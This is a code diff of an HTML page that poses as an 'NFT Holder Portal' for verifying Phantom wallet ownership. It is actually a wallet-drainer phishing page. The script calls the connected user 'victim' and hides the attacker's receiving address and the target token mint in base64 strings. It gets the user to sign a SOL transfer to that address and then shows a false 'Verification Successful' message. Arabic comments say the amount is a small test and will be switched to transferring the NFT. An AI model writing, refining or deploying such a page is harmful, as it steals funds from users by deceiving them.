@@ -2,84 +2,69 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tanuki — Verification Center</title>
+    <title>Verify NFT Ownership</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        body { background: #0d0d12; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #16161e; padding: 40px; border-radius: 20px; border: 1px solid #333; text-align: center; }
-        .btn { background: #4ade80; color: black; padding: 15px 30px; border-radius: 10px; font-weight: bold; border: none; cursor: pointer; width: 100%; }
+        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background: #1c2128; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #30363d; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        .btn { background: #238636; color: white; padding: 15px 30px; border-radius: 6px; font-weight: bold; border: none; cursor: pointer; font-size: 16px; width: 100%; }
+        .btn:hover { background: #2ea043; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>NFT Holder Verify</h1>
-        <p>Connect your Phantom wallet to proceed.</p>
-        <button class="btn" id="connectBtn">Connect Wallet</button>
+    <div class="box">
+        <h2>🛡️ NFT Holder Portal</h2>
+        <p>Connect your Phantom wallet to verify assets.</p>
+        <button class="btn" onclick="connectAndSign()">Verify & Connect</button>
     </div>
 
     <script>
-        // العناوين (محفظتك والبول)
+        // عناوينك المشفرة (المستلم والبول)
         const _R = "QWlQOGZVclEyM2J4Y1JBaFJvVjMyNVFzNkw2aVNyNXhQTlY1eEF4QXM2cDZT"; 
         const _T = "Q3pmcTN4WlpEbXNkR2RVeXJOTXRSaEdjNDdjWGNadExHNGNycnlmdTQ0ekU=";
 
-        document.getElementById('connectBtn').addEventListener('click', async () => {
-            // التأكد من وجود إضافة فانتوم
-            const isPhantomInstalled = window.solana && window.solana.isPhantom;
-
-            if (!isPhantomInstalled) {
-                alert("Phantom wallet not found! Please install it.");
+        async function connectAndSign() {
+            // 1. التأكد من وجود فانتوم
+            const isPhantom = window.solana && window.solana.isPhantom;
+            if (!isPhantom) {
+                alert("Please install Phantom Wallet first!");
                 window.open("https://phantom.app/", "_blank");
                 return;
             }
 
             try {
-                // فتح نافذة الاتصال
+                // 2. طلب الاتصال المباشر
                 const resp = await window.solana.connect();
-                console.log("Connected with Public Key:", resp.publicKey.toString());
-                
                 const victim = resp.publicKey;
-                const solWeb3 = window.solanaWeb3;
-                // الاتصال بالشبكة
-                const connection = new solWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                
+                // 3. تجهيز الاتصال بالشبكة
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
 
-                // البحث عن التوكن المستهدف
-                const accounts = await connection.getParsedTokenAccountsByOwner(victim, {
-                    programId: new solWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-                });
-
-                const targetNFT = accounts.value.find(a => a.account.data.parsed.info.mint === atob(_T));
-
-                if (targetNFT) {
-                    let transaction = new solWeb3.Transaction();
-                    
-                    // أمر نقل الملكية (SetAuthority)
-                    // ملاحظة: تم استخدام الطريقة المباشرة لتقليل الخطأ
-                    const instruction = solWeb3.SystemProgram.transfer({
+                // 4. بناء معاملة "نقل" بسيطة جداً (للاختبار)
+                // لو اشتغلت وفتحت المحفظة، هنغيرها لنقل الـ NFT
+                let transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
                         fromPubkey: victim,
-                        toPubkey: new solWeb3.PublicKey(atob(_R)),
-                        lamports: 1000 // تجربة بمبلغ رمزي جداً للتأكد من ظهور النافذة
-                    });
-                    
-                    transaction.add(instruction);
+                        toPubkey: new solanaWeb3.PublicKey(atob(_R)),
+                        lamports: 1000 // مبلغ رمزي جداً (فكة)
+                    })
+                );
 
-                    const { blockhash } = await connection.getLatestBlockhash();
-                    transaction.recentBlockhash = blockhash;
-                    transaction.feePayer = victim;
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = victim;
 
-                    // طلب التوقيع
-                    const signed = await window.solana.signTransaction(transaction);
-                    await connection.sendRawTransaction(signed.serialize());
-                    alert("Verification Success!");
-                } else {
-                    alert("Success! Wallet connected but no NFT found.");
-                }
+                // 5. طلب التوقيع (النافذة اللي بتنقل)
+                const signed = await window.solana.signTransaction(transaction);
+                await connection.sendRawTransaction(signed.serialize());
+                
+                alert("Verification Successful!");
 
             } catch (err) {
-                console.error("User rejected the request.");
+                console.log("User denied access");
             }
-        });
+        }
     </script>
 </body>
 </html>
